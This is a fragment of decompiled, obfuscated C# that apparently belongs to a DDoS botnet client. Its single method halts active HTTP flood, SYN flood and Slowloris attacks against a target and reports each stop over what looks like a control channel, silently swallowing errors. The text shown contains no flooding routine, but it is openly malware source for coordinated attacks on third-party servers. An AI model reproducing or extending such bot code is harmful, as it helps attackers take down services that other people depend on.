internal sealed class Class4
{
	public static void smethod_0()
	{
		try
		{
			if (Class2.bool_0)
			{
				Class2.smethod_2();
				Class2.bool_0 = false;
				Class29.class26_0.method_3("DDos: Stopped HTTP flooding " + Class2.string_0 + "!", Class30.string_1, "brown");
			}
		}
		catch
		{
		}
		try
		{
			if (Class7.bool_0)
			{
				Class7.smethod_1();
				Class7.bool_0 = false;
				Class29.class26_0.method_3("DDos: Stopped SYN flooding " + Class7.string_0 + "!", Class30.string_1, "brown");
			}
		}
		catch
		{
		}
		try
		{
			if (Class5.bool_0)
			{
				Class5.smethod_1();
				Class29.class26_0.method_3("DDos: Stopped SLOWLORIS flooding " + Class5.string_0 + "!", Class30.string_1, "brown");
			}
		}
		catch
		{
		}
	}
}
